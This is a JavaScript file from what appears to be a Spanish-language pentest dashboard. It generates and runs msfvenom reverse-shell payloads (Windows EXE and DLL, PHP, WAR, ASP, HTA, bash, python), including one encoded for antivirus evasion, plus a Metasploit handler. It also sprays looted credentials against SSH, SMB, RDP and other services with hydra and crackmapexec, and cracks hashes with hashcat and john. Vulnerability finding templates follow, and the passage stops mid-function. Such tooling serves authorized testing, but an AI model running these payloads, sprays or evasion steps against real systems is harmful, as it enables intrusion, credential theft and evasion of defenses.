//  PAYLOAD GENERATOR
// ══════════════════════════════════════════════════════════════════════════════

const PAYLOAD_TEMPLATES = [
    { name:'Windows Staged TCP',   cat:'Windows',      desc:'Staged Meterpreter reverse TCP. Requiere multi/handler.',        cmd:(l,p,a,o)=>`msfvenom -p windows/${a}/meterpreter/reverse_tcp LHOST=${l} LPORT=${p} -f exe -o ${o||'/tmp/shell.exe'}` },
    { name:'Windows Stageless TCP',cat:'Windows',      desc:'Stageless: no requiere handler, mejor en redes filtradas.',      cmd:(l,p,a,o)=>`msfvenom -p windows/${a}/meterpreter_reverse_tcp LHOST=${l} LPORT=${p} -f exe -o ${o||'/tmp/shell_sl.exe'}` },
    { name:'Windows HTTPS Staged', cat:'Windows',      desc:'Staged HTTPS — bypass firewalls que bloquean plain TCP.',       cmd:(l,p,a,o)=>`msfvenom -p windows/${a}/meterpreter/reverse_https LHOST=${l} LPORT=${p} -f exe -o ${o||'/tmp/shell_https.exe'}` },
    { name:'Windows PowerShell',   cat:'Windows',      desc:'Script PS1 — útil si los EXE están bloqueados.',                cmd:(l,p)=>`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${l} LPORT=${p} -f psh -o /tmp/shell.ps1` },
    { name:'Windows DLL',          cat:'Windows',      desc:'DLL para hijacking o inyección.',                               cmd:(l,p,a,o)=>`msfvenom -p windows/${a}/meterpreter/reverse_tcp LHOST=${l} LPORT=${p} -f dll -o ${o||'/tmp/shell.dll'}` },
    { name:'Linux ELF TCP',        cat:'Linux',        desc:'ELF binario. chmod +x y ejecutar.',                             cmd:(l,p,a)=>`msfvenom -p linux/${a}/meterpreter/reverse_tcp LHOST=${l} LPORT=${p} -f elf -o /tmp/shell` },
    { name:'Linux Bash TCP',       cat:'Linux',        desc:'Script bash para reverse shell.',                               cmd:(l,p)=>`msfvenom -p cmd/unix/reverse_bash LHOST=${l} LPORT=${p} -f raw -o /tmp/shell.sh` },
    { name:'HTA (Windows)',        cat:'Client-Side',  desc:'HTA file. Abrir con mshta.exe.',                               cmd:(l,p)=>`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${l} LPORT=${p} -f hta-psh -o /tmp/shell.hta` },
    { name:'Python',               cat:'Cross-Platform',desc:'Script Python — si Python está en el target.',               cmd:(l,p)=>`msfvenom -p cmd/unix/reverse_python LHOST=${l} LPORT=${p} -f raw -o /tmp/shell.py` },
    { name:'Java WAR',             cat:'Web',          desc:'Deploy en Tomcat/JBoss.',                                       cmd:(l,p)=>`msfvenom -p java/jsp_shell_reverse_tcp LHOST=${l} LPORT=${p} -f war -o /tmp/shell.war` },
    { name:'PHP Reverse Shell',    cat:'Web',          desc:'Upload en apps PHP vulnerables.',                               cmd:(l,p)=>`msfvenom -p php/reverse_php LHOST=${l} LPORT=${p} -f raw -o /tmp/shell.php` },
    { name:'ASP Reverse Shell',    cat:'Web',          desc:'Para IIS con upload de ASP.',                                   cmd:(l,p)=>`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${l} LPORT=${p} -f asp -o /tmp/shell.asp` },
    { name:'MSF Handler (RC)',     cat:'Handler',      desc:'Genera y ejecuta handler automáticamente.',                     cmd:(l,p)=>`echo -e 'use multi/handler\\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\\nset LHOST ${l}\\nset LPORT ${p}\\nset ExitOnSession false\\nexploit -j' > /tmp/handler.rc && msfconsole -r /tmp/handler.rc` },
    { name:'Shellcode (C)',        cat:'Shellcode',    desc:'Array en formato C para exploits custom.',                      cmd:(l,p,a)=>`msfvenom -p windows/${a}/meterpreter/reverse_tcp LHOST=${l} LPORT=${p} -f c` },
    { name:'Encoded (shikata x5)',cat:'AV Evasion',   desc:'Codificado con shikata_ga_nai para evasión básica de AV.',     cmd:(l,p,a,o)=>`msfvenom -p windows/${a}/meterpreter/reverse_tcp LHOST=${l} LPORT=${p} -e x86/shikata_ga_nai -i 5 -f exe -o ${o||'/tmp/shell_enc.exe'}` },
];

function initPayloadVars() {
    const lh = document.getElementById('pl-lhost');
    const lp = document.getElementById('pl-lport');
    if (!lh.value) lh.value = state.globalVars.lhost || '';
    if (!lp.value) lp.value = state.globalVars.lport || '4444';
}

function renderPayloads() {
    const lh   = document.getElementById('pl-lhost').value  || '<LHOST>';
    const lp   = document.getElementById('pl-lport').value  || '<LPORT>';
    const arch = document.getElementById('pl-arch').value   || 'x64';
    const out  = document.getElementById('pl-outfile').value|| '';
    const cats = [...new Set(PAYLOAD_TEMPLATES.map(t => t.cat))];
    document.getElementById('payloads-grid').innerHTML = cats.map(cat => {
        const tpls = PAYLOAD_TEMPLATES.filter(t => t.cat === cat);
        return `<div class="col-12">
            <div class="payload-cat-label">${h(cat)}</div>
            <div class="row g-2">
                ${tpls.map(t => {
                    const cmd = t.cmd(lh, lp, arch, out);
                    const cmdJ = JSON.stringify(cmd);
                    return `<div class="col-md-6 col-xl-4">
                        <div class="payload-card">
                            <div class="payload-card-header">
                                <strong class="small">${h(t.name)}</strong>
                                <div class="d-flex gap-1">
                                    <button class="btn btn-xs btn-outline-secondary" onclick="copyToClipboard(${cmdJ})" title="Copiar"><i class="fas fa-copy"></i></button>
                                    <button class="btn btn-xs btn-outline-danger" onclick="executePayload(${cmdJ})" title="Ejecutar"><i class="fas fa-play"></i></button>
                                </div>
                            </div>
                            <p class="text-muted" style="font-size:11px;margin-bottom:6px">${h(t.desc)}</p>
                            <code class="payload-cmd">${h(cmd)}</code>
                        </div>
                    </div>`;
                }).join('')}
            </div>
        </div>`;
    }).join('');
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => toast('Copiado', 'success'));
}

async function executePayload(cmd) {
    if (!state.activeProject) { toast('Selecciona un proyecto primero', 'error'); return; }
    await fetch('/api/run', {
        method: 'POST', headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ command: cmd, project_id: state.activeProject.id, tool: 'Payload Generator', phase: 'av_evasion' }),
    });
    toast('Payload generado → Terminal', 'success');
    loadPhase('terminal');
}

// ══════════════════════════════════════════════════════════════════════════════
//  CREDENTIAL MATRIX
// ══════════════════════════════════════════════════════════════════════════════

const MATRIX_SERVICES = [
    { name:'SSH',    proto:'ssh',   port:22,   spray:(u,p,h)=>`hydra -l ${u} -p ${p} ${h} ssh -t 4` },
    { name:'SMB',    proto:'smb',   port:445,  spray:(u,p,h)=>`crackmapexec smb ${h} -u ${u} -p '${p}'` },
    { name:'FTP',    proto:'ftp',   port:21,   spray:(u,p,h)=>`hydra -l ${u} -p ${p} ${h} ftp -t 4` },
    { name:'RDP',    proto:'rdp',   port:3389, spray:(u,p,h)=>`xfreerdp /v:${h} /u:${u} /p:'${p}' /cert-ignore 2>/dev/null` },
    { name:'WinRM',  proto:'winrm', port:5985, spray:(u,p,h)=>`evil-winrm -i ${h} -u ${u} -p '${p}'` },
    { name:'MySQL',  proto:'mysql', port:3306, spray:(u,p,h)=>`mysql -h ${h} -u ${u} -p${p} -e 'show databases;' 2>&1` },
    { name:'MSSQL',  proto:'mssql', port:1433, spray:(u,p,h)=>`crackmapexec mssql ${h} -u ${u} -p '${p}'` },
    { name:'LDAP',   proto:'ldap',  port:389,  spray:(u,p,h)=>`ldapsearch -x -H ldap://${h} -D "${u}" -w '${p}' -b '' -s base 2>&1` },
];

async function loadCredMatrix() {
    if (!state.activeProject) return;
    const res = await fetch(`/api/projects/${state.activeProject.id}/credential_matrix`);
    state.credMatrix = await res.json();
    renderCredMatrix();
}

function renderCredMatrix() {
    const wrap = document.getElementById('matrix-wrap');
    const { users, services, results } = state.credMatrix;
    if (!users || !users.length || !services || !services.length) {
        wrap.innerHTML = `<div class="text-center text-muted p-5">
            <i class="fas fa-table fa-2x mb-3 d-block"></i>
            Configura usuarios y servicios para empezar.
            <div class="mt-3"><button class="btn btn-outline-secondary" onclick="showMatrixConfigModal()"><i class="fas fa-sliders"></i> Configurar</button></div>
        </div>`;
        return;
    }
    const icon = s => ({'valid':'<span class="text-success"><i class="fas fa-check-circle"></i></span>','invalid':'<span class="text-danger"><i class="fas fa-times-circle"></i></span>','untested':'<span class="text-muted"><i class="fas fa-circle-question"></i></span>'}[s]||'<span class="text-muted"><i class="fas fa-circle-question"></i></span>');
    let html = `<div class="matrix-container"><table class="table table-dark table-bordered table-sm matrix-table">
        <thead><tr><th class="matrix-user-col">Usuario / Servicio</th>`;
    for (const svc of services) {
        html += `<th class="text-center"><div class="d-flex flex-column align-items-center gap-1">
            <span class="small">${h(svc.name)}</span>
            <button class="btn btn-xs btn-outline-warning" onclick="sprayService('${h(svc.name)}')" title="Spray ${svc.name}"><i class="fas fa-spray-can-sparkles"></i></button>
        </div></th>`;
    }
    html += '</tr></thead><tbody>';
    for (const user of users) {
        html += `<tr><td class="matrix-user-col font-monospace small">${h(user)}</td>`;
        for (const svc of services) {
            const k = `${user}::${svc.name}`;
            const status = results[k] || 'untested';
            const bgMap = { valid:'rgba(63,185,80,0.08)', invalid:'rgba(248,81,73,0.08)', untested:'' };
            html += `<td class="text-center matrix-cell" style="background:${bgMap[status]||''}" onclick="cycleMatrixCell('${user.replace(/'/g,"\\'")}','${svc.name}')" title="${user} @ ${svc.name}">${icon(status)}</td>`;
        }
        html += '</tr>';
    }
    html += '</tbody></table></div>';
    wrap.innerHTML = html;
}

async function cycleMatrixCell(user, svcName) {
    const k = `${user}::${svcName}`;
    const cycle = { untested:'valid', valid:'invalid', invalid:'untested' };
    state.credMatrix.results[k] = cycle[state.credMatrix.results[k] || 'untested'];
    await saveCredMatrix();
    renderCredMatrix();
}

async function saveCredMatrix() {
    if (!state.activeProject) return;
    await fetch(`/api/projects/${state.activeProject.id}/credential_matrix`, {
        method: 'PUT', headers: {'Content-Type':'application/json'}, body: JSON.stringify(state.credMatrix),
    });
}

function showMatrixConfigModal() {
    document.getElementById('mc-users').value = (state.credMatrix.users || []).join('\n');
    const checksEl = document.getElementById('mc-services-check');
    checksEl.innerHTML = MATRIX_SERVICES.map(svc =>
        `<div class="form-check form-check-inline">
            <input class="form-check-input" type="checkbox" id="mcs-${svc.name}" value="${svc.name}"
                ${(state.credMatrix.services||[]).some(s=>s.name===svc.name)?'checked':''}>
            <label class="form-check-label small" for="mcs-${svc.name}">${svc.name}</label>
        </div>`
    ).join('');
    document.getElementById('mc-service-custom').value = '';
    bsMatrixConfig.show();
}

async function saveMatrixConfig() {
    const users = document.getElementById('mc-users').value.split('\n').map(u=>u.trim()).filter(Boolean);
    const selected = MATRIX_SERVICES.filter(s => document.getElementById(`mcs-${s.name}`)?.checked);
    const custom = document.getElementById('mc-service-custom').value.trim();
    if (custom) selected.push({ name: custom, proto: custom.toLowerCase(), port: 0, spray:(u,p,h)=>`# spray ${custom} on ${h} -u ${u} -p ${p}` });
    state.credMatrix.users = users;
    state.credMatrix.services = selected;
    await saveCredMatrix();
    bsMatrixConfig.hide();
    renderCredMatrix();
    toast('Matrix actualizada', 'success');
}

async function importCredsFromLoot() {
    if (!state.activeProject) return;
    const proj = await (await fetch(`/api/projects/${state.activeProject.id}`)).json();
    const users = [...new Set((proj.loot||[]).filter(l=>l.type==='credential').map(l=>{const m=l.value.match(/^([^:]+):/);return m?m[1]:null}).filter(Boolean))];
    const existing = new Set(state.credMatrix.users||[]);
    const newUsers = users.filter(u=>!existing.has(u));
    if (!newUsers.length) { toast('No hay credenciales nuevas en Loot', 'info'); return; }
    state.credMatrix.users = [...(state.credMatrix.users||[]), ...newUsers];
    await saveCredMatrix();
    renderCredMatrix();
    toast(`${newUsers.length} usuarios importados de Loot`, 'success');
}

async function sprayService(svcName) {
    if (!state.activeProject) return;
    const svc = MATRIX_SERVICES.find(s=>s.name===svcName) || (state.credMatrix.services||[]).find(s=>s.name===svcName);
    const rhost = state.globalVars.rhost || '';
    if (!rhost) { toast('RHOST no configurado', 'error'); return; }
    const proj = await (await fetch(`/api/projects/${state.activeProject.id}`)).json();
    const passwords = [...new Set((proj.loot||[]).filter(l=>l.type==='credential').map(l=>{const m=l.value.match(/^[^:]+:(.*)/);return m?m[1]:null}).filter(Boolean))];
    if (!passwords.length) { toast('No hay contraseñas en Loot', 'error'); return; }
    const users = state.credMatrix.users || [];
    if (!users.length) { toast('No hay usuarios en la Matrix', 'error'); return; }
    const ts = Date.now();
    const uf = `/tmp/spray_users_${ts}.txt`, pf = `/tmp/spray_pass_${ts}.txt`;
    let cmd;
    if (svc && svc.spray) {
        cmd = `printf '%s\\n' ${users.map(u=>`'${u}'`).join(' ')} > ${uf} && printf '%s\\n' ${passwords.map(p=>`'${p}'`).join(' ')} > ${pf} && hydra -L ${uf} -P ${pf} ${rhost} ${svc.proto || svcName.toLowerCase()} -t 4 2>&1`;
    } else {
        cmd = `printf '%s\\n' ${users.map(u=>`'${u}'`).join(' ')} > ${uf} && printf '%s\\n' ${passwords.map(p=>`'${p}'`).join(' ')} > ${pf} && crackmapexec smb ${rhost} -u ${uf} -p ${pf} 2>&1`;
    }
    await fetch('/api/run', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ command:cmd, project_id:state.activeProject.id, tool:`Spray ${svcName}`, phase:'password_attacks' }) });
    toast(`Spray ${svcName} lanzado → Terminal`, 'success');
    loadPhase('terminal');
}

// ══════════════════════════════════════════════════════════════════════════════
//  SCREENSHOTS
// ══════════════════════════════════════════════════════════════════════════════

async function loadScreenshots() {
    if (!state.activeProject) return;
    const res = await fetch(`/api/projects/${state.activeProject.id}/screenshots`);
    renderScreenshots(await res.json());
}

function renderScreenshots(shots) {
    const gallery = document.getElementById('shots-gallery');
    if (!shots || shots.length === 0) {
        gallery.innerHTML = `<div class="text-center text-muted p-5">
            <i class="fas fa-camera fa-2x mb-3 d-block"></i>
            Sin screenshots. Usa "Capturar URL" para tomar capturas con gowitness.
        </div>`;
        return;
    }
    gallery.innerHTML = shots.map(s => `
        <div class="shot-card">
            <a href="${s.url}" target="_blank">
                <img src="${s.url}" alt="${h(s.filename)}" class="shot-img"
                    onerror="this.parentElement.parentElement.querySelector('.shot-label').textContent+=' (error)'">
            </a>
            <div class="shot-label">${h(s.filename)}</div>
        </div>
    `).join('');
}

function showTakeScreenshotModal() {
    document.getElementById('ts-url').value = state.globalVars.rhost ? `http://${state.globalVars.rhost}` : '';
    bsTakeScreenshot.show();
}

async function confirmTakeScreenshot() {
    const url = document.getElementById('ts-url').value.trim();
    if (!url) { toast('URL requerida', 'error'); return; }
    const res = await fetch(`/api/projects/${state.activeProject.id}/screenshot`, {
        method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({url}),
    });
    if (res.ok) {
        toast('Screenshot lanzado → Terminal', 'success');
        bsTakeScreenshot.hide();
        loadPhase('terminal');
    } else {
        const err = await res.json();
        toast(err.error || 'Error', 'error');
    }
}

// ══════════════════════════════════════════════════════════════════════════════
//  ATTACK PATH BUILDER
// ══════════════════════════════════════════════════════════════════════════════

const PATH_NODE_STYLES = {
    attacker:   { color:{ background:'#3fb950', border:'#238636' }, shape:'triangle' },
    target:     { color:{ background:'#f85149', border:'#da3633' }, shape:'box' },
    credential: { color:{ background:'#d29922', border:'#9e6a03' }, shape:'diamond' },
    service:    { color:{ background:'#58a6ff', border:'#1f6feb' }, shape:'ellipse' },
    pivot:      { color:{ background:'#bc8cff', border:'#8957e5' }, shape:'hexagon' },
};

async function loadAttackPath() {
    if (!state.activeProject) return;
    const res = await fetch(`/api/projects/${state.activeProject.id}/attack_path`);
    renderAttackPath(await res.json());
}

function renderAttackPath(data) {
    const container = document.getElementById('attack-path-canvas');
    const nodeStyle = (n) => {
        const s = PATH_NODE_STYLES[n.type] || PATH_NODE_STYLES.target;
        return { ...s, font:{ color:'#c9d1d9', size:12 } };
    };
    const nodes = new vis.DataSet((data.nodes || []).map(n => ({
        id: n.id, label: n.label, title: n.type, ...nodeStyle(n),
    })));
    const edges = new vis.DataSet((data.edges || []).map(e => ({
        id: e.id, from: e.from, to: e.to, label: e.label || '',
        arrows:'to', color:{ color:'#58a6ff' }, font:{ color:'#8b949e', size:10, align:'middle' },
        smooth:{ type:'curvedCW', roundness:0.2 },
    })));
    const options = {
        physics:{ stabilization:true, barnesHut:{ gravitationalConstant:-2500, springLength:140 } },
        interaction:{ hover:true, navigationButtons:true },
        nodes:{ borderWidth:2, shadow:{ enabled:true, color:'rgba(0,0,0,0.5)', size:8 } },
    };
    if (state.attackPath) { try { state.attackPath.destroy(); } catch(e){} }
    state.attackPath = new vis.Network(container, { nodes, edges }, options);
    state.attackPathNodes = nodes;
    state.attackPathEdges = edges;
    state.attackPath.on('stabilized', () => {
        if (nodes.length < 15) state.attackPath.fit({ animation: true });
    });
}

function showAddPathNodeModal() {
    document.getElementById('pn-label').value = '';
    document.getElementById('pn-type').value = 'target';
    bsPathNode.show();
}

function addPathNode() {
    const label = document.getElementById('pn-label').value.trim();
    const type  = document.getElementById('pn-type').value;
    if (!label) { toast('Etiqueta requerida', 'error'); return; }
    const s = PATH_NODE_STYLES[type] || PATH_NODE_STYLES.target;
    state.attackPathNodes.add({ id:`n_${Date.now()}`, label, title:type, ...s, font:{color:'#c9d1d9',size:12} });
    bsPathNode.hide();
    saveAttackPath(false);
    toast('Nodo añadido', 'success');
}

function showAddPathEdgeModal() {
    if (!state.attackPathNodes) { toast('Añade nodos primero', 'error'); return; }
    const nodes = state.attackPathNodes.get();
    const opts = nodes.map(n=>`<option value="${n.id}">${h(n.label)}</option>`).join('');
    document.getElementById('pe-from').innerHTML = opts;
    document.getElementById('pe-to').innerHTML = opts;
    document.getElementById('pe-label').value = '';
    bsPathEdge.show();
}

function addPathEdge() {
    const from  = document.getElementById('pe-from').value;
    const to    = document.getElementById('pe-to').value;
    const label = document.getElementById('pe-label').value.trim();
    if (!from || !to) { toast('Selecciona nodos', 'error'); return; }
    state.attackPathEdges.add({
        id:`e_${Date.now()}`, from, to, label,
        arrows:'to', color:{color:'#58a6ff'}, font:{color:'#8b949e',size:10,align:'middle'},
        smooth:{type:'curvedCW',roundness:0.2},
    });
    bsPathEdge.hide();
    saveAttackPath(false);
    toast('Arista añadida', 'success');
}

async function saveAttackPath(notify = true) {
    if (!state.activeProject || !state.attackPathNodes) return;
    const nodes = state.attackPathNodes.get().map(n=>({id:n.id, label:n.label, type:n.title}));
    const edges = state.attackPathEdges.get().map(e=>({id:e.id, from:e.from, to:e.to, label:e.label||''}));
    await fetch(`/api/projects/${state.activeProject.id}/attack_path`, {
        method:'PUT', headers:{'Content-Type':'application/json'}, body:JSON.stringify({nodes,edges}),
    });
    if (notify) toast('Attack path guardado', 'success');
}

async function clearAttackPath() {
    if (!confirm('¿Limpiar todo el attack path?')) return;
    state.attackPathNodes?.clear();
    state.attackPathEdges?.clear();
    await saveAttackPath(false);
    toast('Attack path limpiado', 'success');
}

// ══════════════════════════════════════════════════════════════════════════════
//  WORDLIST BROWSER
// ══════════════════════════════════════════════════════════════════════════════

async function showWordlistBrowser(targetInputId) {
    state.wlBrowserTarget = targetInputId;
    state.wlSelectedPath = null;
    document.getElementById('wl-selected-path').textContent = 'No seleccionado';
    document.getElementById('wl-select-btn').disabled = true;
    bsWordlistBrowser.show();
    await browseWordlists('');
}

async function browseWordlists(path) {
    const url = path ? `/api/wordlists?path=${encodeURIComponent(path)}` : '/api/wordlists';
    const res = await fetch(url);
    const data = await res.json();
    const bc = document.getElementById('wl-breadcrumb');
    if (!path) {
        bc.innerHTML = '<span class="wl-bc-item active">Raíz</span>';
    } else {
        const parts = path.split('/').filter(Boolean);
        let built = '';
        bc.innerHTML = `<span class="wl-bc-item" onclick="browseWordlists('')">Raíz</span>` +
            parts.map(p => { built += '/' + p; const bp = built; return ` / <span class="wl-bc-item" onclick="browseWordlists('${h(bp)}')">${h(p)}</span>`; }).join('');
    }
    const fl = document.getElementById('wl-file-list');
    if (Array.isArray(data)) {
        fl.innerHTML = data.map(item => {
            if (item.type === 'dir') {
                return `<div class="wl-item wl-dir" onclick="browseWordlists('${h(item.path)}')">
                    <i class="fas fa-folder text-warning me-2"></i><span>${h(item.name)}</span>
                </div>`;
            }
            const sz = item.size > 1024*1024 ? `${(item.size/1024/1024).toFixed(1)}MB` : item.size > 1024 ? `${(item.size/1024).toFixed(0)}KB` : `${item.size}B`;
            return `<div class="wl-item wl-file" onclick="selectWordlist('${h(item.path)}',this)">
                <i class="fas fa-file-lines text-muted me-2"></i>
                <span class="flex-grow-1">${h(item.name)}</span>
                <span class="text-muted small">${sz}</span>
            </div>`;
        }).join('') || '<div class="text-muted small p-3">Directorio vacío</div>';
    } else {
        fl.innerHTML = `<div class="text-muted small p-3">${h(data.error || 'Error')}</div>`;
    }
}

function selectWordlist(path, el) {
    document.querySelectorAll('.wl-file').forEach(e => e.classList.remove('active'));
    el.classList.add('active');
    state.wlSelectedPath = path;
    document.getElementById('wl-selected-path').textContent = path;
    document.getElementById('wl-select-btn').disabled = false;
}

function confirmWordlistSelect() {
    if (!state.wlSelectedPath || !state.wlBrowserTarget) return;
    const input = document.getElementById(state.wlBrowserTarget);
    if (input) input.value = state.wlSelectedPath;
    bsWordlistBrowser.hide();
}

// ══════════════════════════════════════════════════════════════════════════════
//  HASH CRACKER
// ══════════════════════════════════════════════════════════════════════════════

function showHashCrackerModal() {
    document.getElementById('hc-hashes').value = '';
    document.getElementById('hc-extra').value = '';
    bsHashCracker.show();
    renderHashLootList();
}

function renderHashLootList() {
    if (!state.activeProject) return;
    fetch(`/api/projects/${state.activeProject.id}`)
        .then(r => r.json())
        .then(proj => {
            const hashes = (proj.loot || []).filter(l => l.type === 'hash');
            const el = document.getElementById('hc-hash-list');
            if (!hashes.length) { el.innerHTML = ''; return; }
            el.innerHTML = `<div class="text-muted small mb-1">Hashes en Loot (click para añadir):</div>
                <div class="d-flex flex-wrap gap-1 mb-2">
                    ${hashes.map(item => `<span class="badge bg-secondary cursor-pointer" onclick="addHashToInput(${JSON.stringify(item.value)})" title="${h(item.source||'')} · ${h(item.type)}">${h(item.value.substring(0,32))}${item.value.length>32?'…':''}</span>`).join('')}
                </div>`;
        });
}

function addHashToInput(hash) {
    const ta = document.getElementById('hc-hashes');
    const existing = ta.value.trim();
    ta.value = existing ? `${existing}\n${hash}` : hash;
}

function importHashesFromLoot() {
    if (!state.activeProject) return;
    fetch(`/api/projects/${state.activeProject.id}`)
        .then(r=>r.json())
        .then(proj => {
            const hashes = (proj.loot||[]).filter(l=>l.type==='hash').map(l=>l.value);
            document.getElementById('hc-hashes').value = hashes.join('\n');
            toast(`${hashes.length} hashes importados`, 'success');
        });
}

function updateHashCrackerUI() {}

async function runHashCracker() {
    if (!state.activeProject) { toast('Selecciona un proyecto', 'error'); return; }
    const hashes  = document.getElementById('hc-hashes').value.trim();
    if (!hashes) { toast('Añade hashes para crackear', 'error'); return; }
    const tool    = document.getElementById('hc-tool').value;
    const mode    = document.getElementById('hc-mode').value;
    const wl      = document.getElementById('hc-wordlist').value.trim() || '/usr/share/wordlists/rockyou.txt';
    const extra   = document.getElementById('hc-extra').value.trim();
    const hashFile = `/tmp/hashes_${Date.now()}.txt`;
    const escaped = hashes.replace(/'/g, "'\\''");
    let cmd;
    if (tool === 'hashcat') {
        cmd = `printf '%s\\n' '${escaped}' > ${hashFile} && hashcat -m ${mode} ${hashFile} ${wl} ${extra} --potfile-disable 2>&1 | tail -80`;
    } else {
        cmd = `printf '%s\\n' '${escaped}' > ${hashFile} && john --wordlist=${wl} ${hashFile} ${extra} 2>&1 && john --show ${hashFile} 2>&1`;
    }
    const res = await fetch('/api/run', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ command:cmd, project_id:state.activeProject.id, tool:`Hash Cracker (${tool})`, phase:'password_attacks' }),
    });
    if (res.ok) {
        toast('Hash cracking lanzado → Terminal', 'success');
        bsHashCracker.hide();
        loadPhase('terminal');
    }
}

// ══════════════════════════════════════════════════════════════════════════════
//  FINDING TEMPLATES
// ══════════════════════════════════════════════════════════════════════════════

const FINDING_TEMPLATES = [
    { name:'MS17-010 (EternalBlue)',    sev:'critical', cvss:9.8, cve:'CVE-2017-0144',
      title:'MS17-010 EternalBlue — Remote Code Execution',
      desc:'El sistema es vulnerable a MS17-010, vulnerabilidad crítica en SMBv1 de Windows. Permite ejecución remota de código sin autenticación previa. Explotable con Metasploit (ms17_010_eternalblue).',
      rem:'Aplicar parche MS17-010 (KB4012212). Deshabilitar SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false. Aislar el sistema hasta que sea parcheado.' },
    { name:'PrintNightmare',            sev:'critical', cvss:8.8, cve:'CVE-2021-34527',
      title:'PrintNightmare — Windows Print Spooler RCE/LPE',
      desc:'Vulnerabilidad en Windows Print Spooler permite ejecución remota de código con privilegios SYSTEM. Afecta sistemas Windows con el servicio habilitado.',
      rem:'Deshabilitar Print Spooler en DCs y sistemas no necesarios: Stop-Service Spooler; Set-Service Spooler -StartupType Disabled. Aplicar parche KB5005010.' },
    { name:'Log4Shell',                 sev:'critical', cvss:10.0, cve:'CVE-2021-44228',
      title:'Log4Shell — Log4j Remote Code Execution',
      desc:'Vulnerabilidad crítica en Apache Log4j2 (2.0-2.14.1). Permite RCE mediante JNDI lookup en mensajes de log. Explotable sin autenticación.',
      rem:'Actualizar Log4j a 2.17.1+. Mitigación temporal: log4j2.formatMsgNoLookups=true. Bloquear tráfico LDAP/RMI saliente.' },
    { name:'SQL Injection',             sev:'high',     cvss:8.5, cve:'',
      title:'SQL Injection en aplicación web',
      desc:'Vulnerabilidad de inyección SQL detectada. Un atacante puede manipular consultas para extraer, modificar o eliminar datos de la base de datos.',
      rem:'Usar prepared statements / consultas parametrizadas. Validar input estrictamente. Aplicar mínimo privilegio al usuario de BD. No exponer mensajes de error de BD.' },
    { name:'XSS (Reflected)',           sev:'medium',   cvss:6.1, cve:'',
      title:'Cross-Site Scripting (XSS) Reflejado',
      desc:'La aplicación refleja input sin sanitización en respuestas HTML, permitiendo inyección de scripts. Un atacante puede robar sesiones o ejecutar acciones en nombre de la víctima.',
      rem:'Sanitizar todo input antes de renderizarlo. Implementar Content Security Policy (CSP). Usar funciones de encoding HTML del framework.' },
    { name:'Kerberoasting',             sev:'high',     cvss:7.5, cve:'',
      title:'Kerberoasting — Service Account Hash Extraction',
      desc:'Cuentas de servicio con SPNs son vulnerables a Kerberoasting. Un atacante autenticado puede solicitar tickets TGS y crackearlos offline para obtener credenciales.',
      rem:'Usar gMSA (Group Managed Service Accounts). Contraseñas de cuentas de servicio largas (+25 chars). Monitorizar eventos 4769.' },
    { name:'AS-REP Roasting',           sev:'high',     cvss:7.5, cve:'',
      title:'AS-REP Roasting — Pre-Auth Disabled Accounts',
      desc:'Cuentas con pre-autenticación Kerberos desactivada. Un atacante sin credenciales puede solicitar AS-REP tickets y crackearlos offline.',
      rem:'Activar pre-autenticación Kerberos en todas las cuentas (DONT_REQ_PREAUTH). Monitorizar eventos 4768.' },
    { name:'Pass-the-Hash',             sev:'high',     cvss:8.1, cve:'',
      title:'Pass-the-Hash — Lateral Movement via NTLM',
      desc:'Hashes NTLM obtenidos permiten autenticación sin conocer la contraseña. Permite movimiento lateral a sistemas que aceptan la misma credencial.',
      rem:'Implementar Windows Credential Guard. LAPS para contraseñas locales únicas. Deshabilitar NTLM donde sea posible. Segmentar la red.' },
    { name:'LAPS no configurado',       sev:'high',     cvss:7.2, cve:'',
      title:'LAPS no implementado — Reutilización de contraseña local admin',
      desc:'LAPS no está configurado. La cuenta de administrador local usa la misma contraseña en múltiples sistemas, facilitando movimiento lateral.',
      rem:'Implementar LAPS. Usar nombre de cuenta local único. Monitorizar uso de la cuenta local de admin.' },
    { name:'Default Credentials',       sev:'critical', cvss:9.8, cve:'',
      title:'Credenciales por Defecto en servicio/aplicación',
      desc:'Servicio o aplicación accesible con credenciales por defecto de fábrica. Acceso no autorizado sin técnicas complejas.',
      rem:'Cambiar todas las contraseñas por defecto antes del despliegue. Política de contraseñas seguras. Inventariar servicios con credenciales conocidas.' },
    { name:'Anonymous FTP',             sev:'medium',   cvss:5.3, cve:'',
      title:'FTP con acceso anónimo habilitado',
      desc:'El servidor FTP permite acceso anónimo, exponiendo el filesystem sin autenticación.',
      rem:'Deshabilitar acceso anónimo. Si es requerido, asegurar que el directorio sea read-only y sin datos sensibles.' },
    { name:'SMB Signing Disabled',      sev:'medium',   cvss:5.9, cve:'',
      title:'SMB Signing no requerido — Vulnerable a NTLM Relay',
      desc:'El servidor SMB no requiere firma de paquetes. Un atacante MITM puede capturar y redirigir autenticaciones NTLM.',
      rem:'Habilitar SMB Signing vía GPO: "Microsoft network server: Digitally sign communications (always)". Deshabilitar LLMNR y NBT-NS.' },
    { name:'BlueKeep',                  sev:'critical', cvss:9.8, cve:'CVE-2019-0708',
      title:'BlueKeep — RDP Pre-Auth Remote Code Execution',
      desc:'Vulnerabilidad pre-autenticación en Remote Desktop Services. RCE sin interacción del usuario. Potencialmente wormable.',
      rem:'Aplicar parche KB4499175. Deshabilitar RDP si no es necesario. Limitar acceso RDP por firewall. Habilitar NLA.' },
    { name:'BloodHound Paths to DA',    sev:'critical', cvss:9.0, cve:'',
      title:'Attack Paths to Domain Admin identificados con BloodHound',
      desc:'BloodHound ha identificado rutas de ataque explotables que permiten escalar privilegios hasta Domain Admin desde una cuenta de usuario estándar.',
      rem:'Revisar y corregir los paths identificados: eliminar delegaciones innecesarias, revisar ACLs de objetos críticos, aplicar tiering de administración.' },
];

function loadFindingTemplates() {
    const menu = document.getElementById('finding-templates-menu');
    if (!menu) return;
    const sevColors = { critical:'#f85149', high:'#f0883e', medium:'#d29922', low:'#3fb950', info:'#58a6ff' };
    menu.innerHTML = FINDING_TEMPLATES.map((t, i) =>
        `<li><a class="dropdown-item small py-1" href="#" onclick="applyFindingTemplate(${i});return false;">
